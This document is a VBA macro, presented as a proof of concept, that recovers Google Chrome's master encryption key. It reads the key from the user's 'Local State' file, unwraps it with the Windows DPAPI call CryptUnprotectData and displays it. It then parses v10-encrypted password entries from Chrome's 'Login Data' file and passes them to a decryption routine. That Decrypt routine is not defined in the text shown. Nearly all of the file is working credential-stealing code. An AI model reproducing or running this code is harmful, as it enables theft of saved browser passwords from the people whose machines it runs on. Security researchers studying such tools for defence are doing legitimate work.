' Export Master Key used by Chrome to encrypt passwords (v80+)
' PoC by Juan Manuel Fernandez (@TheXC3LL)


Private Declare PtrSafe Function CryptUnprotectData Lib "CRYPT32" (ByRef pDataIn As DATA_BLOB, ByVal ppszDataDescr As LongPtr, ByVal pOptionalEntropy As LongPtr, ByVal pvReserved As LongPtr, ByVal pPromptStruct As LongPtr, ByVal dwFlags As Long, ByRef pDataOut As DATA_BLOB) As Long
Private Declare PtrSafe Sub CopyMemory Lib "KERNEL32" Alias "RtlMoveMemory" (ByVal Destination As LongPtr, ByVal Source As LongPtr, ByVal Length As Long)
Private Declare PtrSafe Function BCryptOpenAlgorithmProvider Lib "BCRYPT" (ByVal phAlgorithm As LongPtr, ByVal pszAlgId As LongPtr, ByVal pszImplementation As String, ByVal dwFlags As LongLong) As LongLong
Private Declare PtrSafe Function BCryptSetProperty Lib "BCRYPT" (ByVal phAlgorithm As LongPtr, ByVal pszProperty As LongPtr, ByVal pbInput As LongPtr, ByVal cbInput As LongLong, ByVal dwFlags As LongLong) As LongLong
Private Declare PtrSafe Function BCryptGenerateSymmetricKey Lib "BCRYPT" (ByVal hAlgorithm As LongPtr, phKey As LongPtr, ByVal pbKeyObject As LongLong, ByVal cbKeyObject As LongLong, ByVal pbSecret As LongPtr, ByVal cbSecret As LongLong, ByVal dwFlags As LongLong) As LongLong
Private Declare PtrSafe Function BCryptDecrypt Lib "BCRYPT" (ByVal hKey As LongPtr, ByVal pbInput As LongPtr, ByVal cbInput As LongLong, ByVal pPaddingInfo As LongPtr, ByVal pbIV As LongPtr, ByVal cbIV As LongLong, ByVal pbOutput As LongPtr, ByVal cbOutput As LongLong, ByVal pcbResult As LongPtr, ByVal dwFlags As LongLong) As LongLong
Private Declare PtrSafe Function HeapAlloc Lib "KERNEL32" (ByVal hHeap As LongPtr, ByVal dwFlags As Long, ByVal dwBytes As LongLong) As LongPtr
Private Declare PtrSafe Function GetProcessHeap Lib "KERNEL32" () As LongPtr

Private Type DATA_BLOB
    cbData As Long
    pbData As LongPtr
End Type



Private Type BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO
    cbSize          As Long     ' 0-4 = 4 bytes
    dwInfoVersion   As Long     ' 4-8 = 4 bytes
    pbNonce         As LongLong ' 8-16 = 8 bytes
    cbNonce         As LongLong ' 16-24 = 8 bytes
    pbAuthData      As LongLong ' 24-32 = 8 bytes
    cbAuthData      As LongLong ' 32-40 = 8 bytes
    pbTag           As LongLong ' 40-48 = 8 bytes
    cbTag           As LongLong ' 48-56 = 8 bytes
    pbMacContext    As LongLong ' 56-64 = 8 bytes
    cbMacContext    As Long ' 64-68 = 4 bytes
    cbAAD           As Long ' 68-72 = 4 bytes
    cbData          As LongLong ' 72-80 = 8 bytes
    dwFlags         As LongLong ' 80-88 = 8 bytes
    ' size 88
End Type


'https://www.codestack.net/visual-basic/algorithms/data/encoding/base64/
Private Function Base64ToArray(base64 As String) As Byte()
    
    Dim xmlDoc As Object
    Dim xmlNode As Object
    
    Set xmlDoc = CreateObject("MSXML2.DOMDocument")
    Set xmlNode = xmlDoc.createElement("b64")
    
    xmlNode.DataType = "bin.base64"
    xmlNode.text = base64
    
    Base64ToArray = xmlNode.nodeTypedValue
  
End Function
'https://stackoverflow.com/questions/18793551/get-the-hex-string-of-a-byte-array
Function ByteArrayToHexStr(b() As Byte) As String
   Dim n As Long, i As Long

   ByteArrayToHexStr = Space$(3 * (UBound(b) - LBound(b)) + 2)
   n = 1
   For i = LBound(b) To UBound(b)
      Mid$(ByteArrayToHexStr, n, 2) = Right$("00" & Hex$(b(i)), 2)
      n = n + 3
   Next
End Function



Sub extract_masterkey()
    Dim needle As String
    Dim path As String
    Dim file As String
    Dim line As String
    Dim os_encrypt_init As Long
    Dim os_encrypt_end As Long
    Dim os_encrypt As String
    Dim encrypted_key() As Byte
    Dim dataIn As DATA_BLOB
    Dim dataOut As DATA_BLOB
    Dim vArr() As Byte
    Dim Size As Long
    Dim retVal As Long
    Dim password As String
    Dim master_key(0 To 31) As Byte
    
    needle = "RFBBUEk" 'base64("DPAPI")
    path = Environ("USERPROFILE") & "\\AppData\\Local\\Google\\Chrome\\User Data\\Local State"
    
    Open path For Input As #1
    Do Until EOF(1)
        Line Input #1, line
        file = file & line
    Loop
    Close #1
    
    os_encrypt_init = InStr(1, file, needle, vbTextCompare)
    os_encrypt = Mid(file, os_encrypt_init)
    os_encrypt_end = InStr(1, os_encrypt, """", vbTextCompare) - 1
    os_encrypt = Left(os_encrypt, os_encrypt_end)
    vArr = Base64ToArray(os_encrypt)
    Size = UBound(vArr) - LBound(vArr) + 1
    ReDim encrypted_key(0 To Size - 6)
    CopyMemory VarPtr(encrypted_key(0)), VarPtr(vArr(5)), Size - 5
    
    dataIn.cbData = Size
    dataIn.pbData = VarPtr(encrypted_key(0))
    retVal = CryptUnprotectData(dataIn, 0&, 0&, 0&, 0&, 8, dataOut)
    
    CopyMemory VarPtr(master_key(0)), dataOut.pbData, 32
    MsgBox "MasterKey:" & vbNewLine & ByteArrayToHexStr(master_key)

    path = Environ("USERPROFILE") & "\\AppData\\Local\\Google\\Chrome\\User Data\\default\\Login Data"
    Open path For Input As #2

    Do Until EOF(2)
        Line Input #2, line
        If InStr(1, line, "v10", vbTextCompare) > 0 Then
            password = Mid(line, InStr(1, line, "v10", vbBinaryCompare) + 3)
            password = Left(password, InStr(1, password, "http", vbBinaryCompare) - 1)
            password = Decrypt(master_key, StrConv(password, vbFromUnicode), Len(password)) ' BCryptDecrypt with AES-GCM (12 bytes IV, 16 last bytes for TAG)
        End If
        
    Loop
    Close #2
End Sub


